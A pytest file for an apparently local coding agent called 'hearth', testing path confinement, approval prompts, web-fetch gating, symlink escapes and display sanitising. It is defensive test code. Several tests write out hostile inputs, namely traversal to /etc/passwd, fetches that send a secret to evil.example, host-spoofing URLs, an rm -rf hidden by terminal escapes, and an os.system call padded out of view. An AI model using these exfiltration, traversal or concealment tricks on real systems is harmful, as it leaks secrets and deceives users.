"""hearth code agent — tool execution + path-confinement (no network/LLM)."""

import os
import tempfile

from hearth.code_agent import CodeAgent


def _agent(root):
    return CodeAgent(root, "http://127.0.0.1:11435", "coding", auto=True)


def test_list_read_write_roundtrip():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "a.py"), "w").write("x = 1\n")
    a = _agent(d)
    assert "a.py" in a._exec_tool("list_files", {})
    # read_file is line-numbered: that is what lets the model quote an exact,
    # unique old_string back to edit_file and refer to code by line.
    assert a._exec_tool("read_file", {"path": "a.py"}) == "     1\tx = 1"
    a._exec_tool("write_file", {"path": "sub/b.txt", "content": "hello"})
    assert open(os.path.join(d, "sub", "b.txt")).read() == "hello"


def test_read_file_windows_large_files():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "big.txt"), "w").write("\n".join(f"line {i}" for i in range(1, 101)))
    a = _agent(d)
    out = a._exec_tool("read_file", {"path": "big.txt", "offset": 10, "limit": 5})
    assert "    10\tline 10" in out and "    14\tline 14" in out
    assert "line 15" not in out
    assert "read on with offset=15" in out


def test_list_files_pattern_filters():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "a.py"), "w").write("")
    open(os.path.join(d, "b.md"), "w").write("")
    a = _agent(d)
    out = a._exec_tool("list_files", {"pattern": "*.py"})
    assert "a.py" in out and "b.md" not in out


def test_grep_finds_content_with_location():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "m.py"), "w").write("import os\n\ndef target():\n    pass\n")
    open(os.path.join(d, "n.txt"), "w").write("target\n")
    a = _agent(d)
    out = a._exec_tool("grep", {"pattern": r"def target", "glob": "*.py"})
    assert "m.py:3: def target():" in out
    assert "n.txt" not in out, "glob must restrict which files are searched"
    assert a._exec_tool("grep", {"pattern": "nothing-here"}) == "(no matches)"
    assert a._exec_tool("grep", {"pattern": "["}).startswith("ERROR")


def test_grep_skips_binary_files():
    d = tempfile.mkdtemp()
    with open(os.path.join(d, "blob.bin"), "wb") as fh:
        fh.write(b"needle\x00\x01\x02")
    a = _agent(d)
    assert a._exec_tool("grep", {"pattern": "needle"}) == "(no matches)"


def test_edit_file_replaces_exact_string():
    d = tempfile.mkdtemp()
    p = os.path.join(d, "c.py")
    open(p, "w").write("def add(a, b):\n    return a - b\n")
    a = _agent(d)
    out = a._exec_tool("edit_file", {"path": "c.py",
                                     "old_string": "return a - b",
                                     "new_string": "return a + b"})
    assert "edited" in out
    # The surgical edit must leave everything else byte-identical — the whole
    # reason to prefer it over a full rewrite.
    assert open(p).read() == "def add(a, b):\n    return a + b\n"


def test_edit_file_refuses_ambiguous_match():
    """Silently editing the first of several identical matches is how an agent
    corrupts a file while reporting success."""
    d = tempfile.mkdtemp()
    p = os.path.join(d, "d.py")
    open(p, "w").write("x = 1\nx = 1\n")
    a = _agent(d)
    out = a._exec_tool("edit_file", {"path": "d.py", "old_string": "x = 1", "new_string": "x = 2"})
    assert out.startswith("ERROR") and "2 times" in out
    assert open(p).read() == "x = 1\nx = 1\n", "file must be untouched"
    # …unless the model explicitly asks for every occurrence.
    a._exec_tool("edit_file", {"path": "d.py", "old_string": "x = 1",
                               "new_string": "x = 2", "replace_all": True})
    assert open(p).read() == "x = 2\nx = 2\n"


def test_edit_file_reports_missing_string_and_missing_file():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "e.py"), "w").write("hello\n")
    a = _agent(d)
    assert a._exec_tool("edit_file", {"path": "e.py", "old_string": "nope",
                                      "new_string": "x"}).startswith("ERROR")
    assert a._exec_tool("edit_file", {"path": "gone.py", "old_string": "a",
                                      "new_string": "b"}).startswith("ERROR")


def test_path_escape_is_blocked():
    d = tempfile.mkdtemp()
    a = _agent(d)
    for bad in ("../../etc/passwd", "../outside.txt", "/etc/hosts"):
        assert a._exec_tool("read_file", {"path": bad}).startswith("ERROR")
        # a write that escapes must not create anything
        assert a._exec_tool("write_file", {"path": bad, "content": "x"}).startswith("ERROR")


def test_run_shell_runs_in_root():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "marker.txt"), "w").write("")
    a = _agent(d)
    out = a._exec_tool("run_shell", {"command": "ls"})
    assert "marker.txt" in out and "[exit 0]" in out


def test_denied_when_not_auto(monkeypatch):
    d = tempfile.mkdtemp()
    a = CodeAgent(d, "http://127.0.0.1:11435", "coding", auto=False)
    monkeypatch.setattr("builtins.input", lambda *_: "n")
    assert a._exec_tool("write_file", {"path": "x.txt", "content": "y"}) == "DENIED by user"
    assert not os.path.exists(os.path.join(d, "x.txt"))


def test_search_turned_off_means_no_web_tools(monkeypatch, tmp_path):
    for enabled in (True, False):
        p = tmp_path / "config.yaml"
        p.write_text(f"search: {{enabled: {str(enabled).lower()}}}\n")
        monkeypatch.setenv("HEARTH_CONFIG", str(p))
        a = CodeAgent(str(tmp_path), "http://127.0.0.1:11435", "coding")
        names = {t["function"]["name"] for t in a.tools}
        assert ({"web_search", "web_fetch"} <= names) is enabled
        assert ("web_search" in a.messages[0]["content"]) is enabled


# ── as the mode plain `hearth` opens ──────────────────────────────────────────

import json  # noqa: E402
import sys  # noqa: E402
from pathlib import Path  # noqa: E402

import pytest  # noqa: E402

from hearth import cli, code_agent  # noqa: E402


def _asking(root, monkeypatch, *answers):
    """An agent whose questions are answered in turn; what it asked."""
    asked, left = [], list(answers)

    def answer(prompt=""):
        asked.append(prompt)
        a = left.pop(0)
        if isinstance(a, type):
            raise a
        return a

    monkeypatch.setattr("builtins.input", answer)
    return CodeAgent(str(root), "http://127.0.0.1:1", "coding"), asked


def test_a_change_is_shown_before_it_is_asked_about(tmp_path, monkeypatch, capsys):
    (tmp_path / "a.py").write_text("one\ntwo\nthree\n")
    a, asked = _asking(tmp_path, monkeypatch, "n", "y")
    edit = {"path": "a.py", "old_string": "two", "new_string": "2"}
    assert a._exec_tool("edit_file", edit) == "DENIED by user"
    shown = capsys.readouterr().out
    assert "-two" in shown and "+2" in shown and (tmp_path / "a.py").read_text() == "one\ntwo\nthree\n"
    assert a._exec_tool("edit_file", edit).startswith("edited") and (tmp_path / "a.py").read_text() == "one\n2\nthree\n"


def test_always_is_for_that_and_for_this_session(tmp_path, monkeypatch):
    (tmp_path / "a").write_text("x")
    a, asked = _asking(tmp_path, monkeypatch, "a", "a", "n", "n")
    for name in ("b", "c"):
        assert "created" in a._exec_tool("write_file", {"path": name, "content": "y"})
    assert len(asked) == 1  # edits
    for _ in range(2):
        assert "[exit 0]" in a._exec_tool("run_shell", {"command": "echo hi"})
    assert len(asked) == 2  # that command…
    assert a._exec_tool("run_shell", {"command": "echo hi; echo more"}) == "DENIED by user"  # …and no other
    b, asked2 = _asking(tmp_path, monkeypatch, "n")
    assert b._exec_tool("write_file", {"path": "d", "content": "y"}) == "DENIED by user"


def test_the_web_is_asked_about(tmp_path, monkeypatch):
    """An address is a way out for what was read."""
    went = []

    async def dispatch(name, args, cfg):
        went.append((name, args.get("url")))
        return "page"

    monkeypatch.setattr(code_agent.webtools, "dispatch", dispatch)
    a, asked = _asking(tmp_path, monkeypatch, "n", "a", "n", "n")
    assert a._exec_tool("web_fetch", {"url": "https://evil.example/?k=secret"}) == "DENIED by user" and went == []
    assert a._exec_tool("web_fetch", {"url": "https://docs.example/a"}) == "page"
    assert a._exec_tool("web_fetch", {"url": "https://docs.example/b"}) == "page" and len(asked) == 2
    for other in ("https://docs.example.evil.example/", "https://docs.example@evil.example/"):
        assert a._exec_tool("web_fetch", {"url": other}) == "DENIED by user"
    assert len(went) == 2


def test_what_is_shown_cannot_hide_anything(tmp_path, monkeypatch):
    a, asked = _asking(tmp_path, monkeypatch, "n")
    a._exec_tool("run_shell", {"command": "rm -rf x\r\x1b[2Kecho harmless \u202e"})
    assert "\x1b[2K" not in asked[0] and "\r" not in asked[0] and "\u202e" not in asked[0] and "rm -rf x" in asked[0]


@pytest.mark.parametrize("raw", [b"caf\xe9 = 1\n", b"a\x00b two"])
def test_what_cannot_be_read_faithfully_is_not_written_back(tmp_path, monkeypatch, raw):
    (tmp_path / "f").write_bytes(raw)
    a = _agent(str(tmp_path))
    out = a._exec_tool("edit_file", {"path": "f", "old_string": "1" if b"1" in raw else "two", "new_string": "2"})
    assert out.startswith("ERROR") and (tmp_path / "f").read_bytes() == raw


def test_line_endings_stay(tmp_path):
    (tmp_path / "f").write_bytes(b"a\r\nb\r\nc\r\n")
    a = _agent(str(tmp_path))
    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "a\nb", "new_string": "A\nB"})
    assert (tmp_path / "f").read_bytes() == b"A\r\nB\r\nc\r\n"
    a._exec_tool("write_file", {"path": "g", "content": "x\ny\n"})
    assert (tmp_path / "g").read_bytes() == b"x\ny\n"


def test_a_file_that_changed_while_it_was_asked_about(tmp_path, monkeypatch):
    f = tmp_path / "f"
    f.write_text("one")
    a, _ = _asking(tmp_path, monkeypatch, "y")
    monkeypatch.setattr("builtins.input", lambda *_: f.write_text("one, by somebody") and "y")
    assert "changed meanwhile" in a._exec_tool("edit_file", {"path": "f", "old_string": "one", "new_string": "two"})
    assert f.read_text() == "one, by somebody"


@pytest.mark.skipif(sys.platform == "win32", reason="links")
def test_links_do_not_lead_out(tmp_path):
    (tmp_path / "out").mkdir()
    (tmp_path / "out" / "key").write_text("SECRET")
    root = tmp_path / "root"
    root.mkdir()
    (root / "in").write_text("SECRET of the project")
    (root / "key").symlink_to(tmp_path / "out" / "key")
    (root / "dir").symlink_to(tmp_path / "out")
    (root / "alias").symlink_to(root / "in")
    a = _agent(str(root))
    hits = a._exec_tool("grep", {"pattern": "SECRET"})
    assert sorted(h.split(":")[0] for h in hits.splitlines()) == ["alias", "in"]
    for path in ("key", "dir/key"):
        assert "escapes" in a._exec_tool("read_file", {"path": path})
        assert "escapes" in a._exec_tool("write_file", {"path": path, "content": "x"})


@pytest.mark.skipif(sys.platform == "win32", reason="sleep")
def test_a_command_that_is_too_slow_ends_with_all_it_started(tmp_path):
    import time

    a = _agent(str(tmp_path))
    t0 = time.monotonic()
    out = a._exec_tool("run_shell", {"command": "(sleep 60; touch late) & sleep 60", "timeout": 1})
    assert "timed out" in out and time.monotonic() - t0 < 20


def test_ctrl_c_ends_the_task_and_not_the_session(tmp_path, monkeypatch):
    calls = [{"id": "1", "function": {"name": "run_shell", "arguments": json.dumps({"command": "x"})}},
             {"id": "2", "function": {"name": "grep", "arguments": json.dumps({"pattern": "x"})}}]
    a, _ = _asking(tmp_path, monkeypatch, KeyboardInterrupt)
    monkeypatch.setattr(a, "_stream_turn", lambda: ("", calls))
    assert a.ask("do it") == ""
    # every call has its result, and the conversation can go on
    assert [m.get("tool_call_id") for m in a.messages if m["role"] == "tool"] == ["1", "2"]
    assert a.messages[-1]["role"] == "assistant"
    monkeypatch.setattr(a, "_stream_turn", lambda: (_ for _ in ()).throw(KeyboardInterrupt))
    assert a.ask("again") == "" and a.messages[-1]["role"] == "assistant"


def test_a_request_that_failed_is_not_asked_twice(tmp_path, monkeypatch):
    a = _agent(str(tmp_path))
    monkeypatch.setattr(a, "_stream_turn", lambda: (None, []))
    n = len(a.messages)
    a.ask("x")
    assert len(a.messages) == n


def test_always_for_one_address_is_not_for_one_without_a_scheme(tmp_path, monkeypatch):
    went = []

    async def dispatch(name, args, cfg):
        went.append(args["url"])
        return "page"

    monkeypatch.setattr(code_agent.webtools, "dispatch", dispatch)
    a, asked = _asking(tmp_path, monkeypatch, "a", "n", "a", "n")
    assert a._exec_tool("web_fetch", {"url": "docs.example/3"}) == "page"
    assert a._exec_tool("web_fetch", {"url": "evil.example/?d=secret"}) == "DENIED by user"
    assert a._exec_tool("web_fetch", {"url": "HTTP://Docs.Example/4"}) == "page" and len(asked) == 2
    # one with no host is asked about each time
    assert a._exec_tool("web_fetch", {"url": "file:///etc/passwd"}) == "DENIED by user" and "always" not in asked[2]
    assert went == ["http://docs.example/3", "HTTP://Docs.Example/4"]


def test_what_is_not_shown_is_said_not_to_be(tmp_path, monkeypatch, capsys):
    (tmp_path / "f").write_text("x = 0\n")
    a, _ = _asking(tmp_path, monkeypatch, "n", "n")
    a._exec_tool("edit_file", {"path": "f", "old_string": "x = 0", "new_string": "x = 1" + " " * 300 + "; os.system('evil')"})
    assert "os.system('evil')" in capsys.readouterr().out
    a._exec_tool("write_file", {"path": "g", "content": "ok\n" + "y" * 9000 + "evil"})
    out = capsys.readouterr().out
    assert "NOT SHOWN" in out and "+ok" in out


def test_each_place_keeps_its_line_ending(tmp_path):
    f = tmp_path / "f"
    a = _agent(str(tmp_path))
    f.write_bytes(b"one\r\ntwo\nthree\nfour\r\n")
    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "two\nthree", "new_string": "2\n3"})
    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "one", "new_string": "1\n1b"})
    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "four\n", "new_string": "4\n5\n"})
    assert f.read_bytes() == b"1\r\n1b\r\n2\n3\n4\r\n5\r\n"
    f.write_bytes(b"a.b\na.b\naxb\n")  # taken literally
    assert "2 replacement" in a._exec_tool("edit_file", {"path": "f", "old_string": "a.b", "new_string": r"\1\g<0>", "replace_all": True})
    assert f.read_bytes() == b"\\1\\g<0>\n\\1\\g<0>\naxb\n"


@pytest.mark.skipif(sys.platform == "win32", reason="links")
def test_a_link_to_itself_is_passed_over(tmp_path):
    (tmp_path / "loop").symlink_to("loop")
    (tmp_path / "f").write_text("hello")
    a = _agent(str(tmp_path))
    assert a._exec_tool("grep", {"pattern": "hello"}) == "f:1: hello" and "f" in a._exec_tool("list_files", {})


@pytest.mark.skipif(sys.platform == "win32", reason="a shell's background")
def test_what_a_command_left_in_the_background_ends_with_it(tmp_path):
    import time

    import psutil

    a = _agent(str(tmp_path))
    out = a._exec_tool("run_shell", {"command": "sleep 7777 & echo $! > pid; echo hi", "timeout": 1})
    assert "timed out" in out
    pid = int((tmp_path / "pid").read_text())
    deadline = time.monotonic() + 5
    while psutil.pid_exists(pid) and psutil.Process(pid).status() != psutil.STATUS_ZOMBIE and time.monotonic() < deadline:
        time.sleep(0.1)
    assert not psutil.pid_exists(pid) or psutil.Process(pid).status() == psutil.STATUS_ZOMBIE


# ── getting there ─────────────────────────────────────────────────────────────

@pytest.fixture
def terminal(tmp_path, monkeypatch):
    """At a terminal, in a folder, with an engine that has a model."""
    monkeypatch.setenv("HEARTH_CONFIG", str(tmp_path / "conf" / "config.yaml"))
    project = tmp_path / "project"
    (project / "sub").mkdir(parents=True)
    monkeypatch.chdir(project)
    monkeypatch.setattr(sys.stdin, "isatty", lambda: True, raising=False)
    monkeypatch.setattr(cli, "_engine_ready", lambda cfg, role, model: "http://127.0.0.1:1")
    said = []

    def answers(*lines):
        left = list(lines)

        def answer(prompt=""):
            said.append(prompt)
            if not left:
                raise EOFError
            return left.pop(0)

        monkeypatch.setattr("builtins.input", answer)
        return said

    answers.project = project
    return answers


def test_a_folder_is_trusted_once(terminal, monkeypatch):
    said = terminal("n")
    assert cli.main([]) == 1 and len(said) == 1  # no: nothing is read
    said = terminal("y", "/exit")
    said.clear()
    assert cli.main([]) == 0 and "trust" in said[0]
    for folder in (terminal.project, terminal.project / "sub"):
        monkeypatch.chdir(folder)
        said.clear()
        terminal("/exit")
        assert cli.main([]) == 0 and len(said) == 1, folder
    said.clear()
    terminal("n")
    monkeypatch.chdir(terminal.project.parent)
    assert cli.main([]) == 1 and "trust" in said[0]  # what it is in, is another question


def test_home_is_asked_about_each_time_and_trusts_nothing_in_it(terminal, monkeypatch):
    home = terminal.project.parent
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
    monkeypatch.chdir(home)
    for _ in range(2):
        said = terminal("y", "/exit")
        said.clear()
        assert cli.main([]) == 0 and "trust" in said[0]
    monkeypatch.chdir(terminal.project)
    said = terminal("n")
    said.clear()
    assert cli.main([]) == 1 and "trust" in said[0]


def test_nobody_to_ask_is_refused(terminal, monkeypatch, capsys):
    monkeypatch.setattr(sys.stdin, "isatty", lambda: False, raising=False)
    said = terminal("y", "y")
    assert cli.main([]) == 2 and said == [] and "hearth -p" in capsys.readouterr().err


def test_one_task_and_its_answer(terminal, monkeypatch, capsys):
    said = terminal()
    monkeypatch.setattr(CodeAgent, "ask", lambda self, t: f"did {t}" if self.auto else "")
    assert cli.main(["-p", "it", "-q"]) == 0 and capsys.readouterr().out.strip() == "did it" and said == []
    monkeypatch.setattr(CodeAgent, "ask", lambda self, t: "")
    assert cli.main(["-p", "it"]) == 1  # a script can tell


def test_from_one_mode_to_the_other_and_back(terminal, monkeypatch, capsys):
    agents = []
    made = CodeAgent.__init__
    monkeypatch.setattr(CodeAgent, "__init__", lambda self, *a, **k: agents.append(1) or made(self, *a, **k))
    terminal("y", "/chat", "/system be brief", "/code", "/chat", "/system", "/exit")
    assert cli.main([]) == 0
    out = capsys.readouterr().out
    assert agents == [1] and "system: be brief" in out  # each kept what it had


def test_without_a_model_it_says_where_to_choose_one(monkeypatch, capsys, tmp_path):
    import httpx

    from hearth import background, config

    monkeypatch.setenv("HEARTH_CONFIG", str(tmp_path / "config.yaml"))
    cfg = config.load()
    up = []
    monkeypatch.setattr(background, "gateway_identity", lambda c: "hearth/9" if up else None)
    monkeypatch.setattr(cli, "cmd_start", lambda a: up.append(True) or 0)
    monkeypatch.setattr(cli.httpx, "get", lambda *a, **k: httpx.Response(200, json={"roles": {"embedding": {}}}))
    assert cli._engine_ready(cfg, "coding", None) is None
    assert up == [True] and "hearth setup" in capsys.readouterr().err
    assert cli._engine_ready(cfg, "coding", "some-model") == cli._admin_base(cfg)  # one was named
    assert cli._engine_ready(cfg, "embedding", None) and up == [True]  # started once


def test_a_mode_that_cannot_be_gone_to_does_not_end_the_session(terminal, capsys):
    """…and what was said so far stays."""
    terminal("/system be brief", "/code", "n", "/system", "/exit")
    assert cli.main(["chat"]) == 0
    assert "system: be brief" in capsys.readouterr().out


def test_each_mode_keeps_its_model_and_settings(terminal, monkeypatch, capsys):
    asked = []
    monkeypatch.setattr(cli, "_engine_ready", lambda cfg, role, model: asked.append((role, model)) or "http://127.0.0.1:1")
    terminal("/model other", "/think off", "/code", "y", "/model coder", "/chat", "/status", "/code", "/exit")
    assert cli.main(["chat", "--model", "big"]) == 0
    assert asked == [("primary_chat", "big"), ("coding", None)]  # (come back to, the engine is not asked again)
    out = capsys.readouterr().out
    assert "model: other · deep-think: off" in out and "· model coder ·" in out


def test_the_answer_is_all_there_is_on_stdout(monkeypatch, capsys, tmp_path):
    import httpx

    from hearth import background

    monkeypatch.setenv("HEARTH_CONFIG", str(tmp_path / "config.yaml"))
    monkeypatch.setattr(background, "gateway_identity", lambda c: None)
    monkeypatch.setattr(background, "start", lambda *a: (True, "running (hearth/9)"))
    monkeypatch.setattr(cli.httpx, "get", lambda *a, **k: httpx.Response(200, json={"roles": {"coding": {}}}))
    monkeypatch.setattr(CodeAgent, "ask", lambda self, t: "the answer")
    assert cli.main(["-q", "-p", "x"]) == 0
    got = capsys.readouterr()
    assert got.out == "the answer\n" and "running" in got.err


def test_an_engine_that_died_does_not_end_the_session(terminal, monkeypatch, capsys):
    ups = [True]
    monkeypatch.setattr(cli, "_engine_ready", lambda cfg, role, model: "http://127.0.0.1:1" if ups.pop(0) else None)
    ups += [False]  # asked for by the mode it cannot go to, and not by the one it comes back to
    terminal("y", "/chat", "/exit")
    assert cli.main([]) == 0 and ups == []
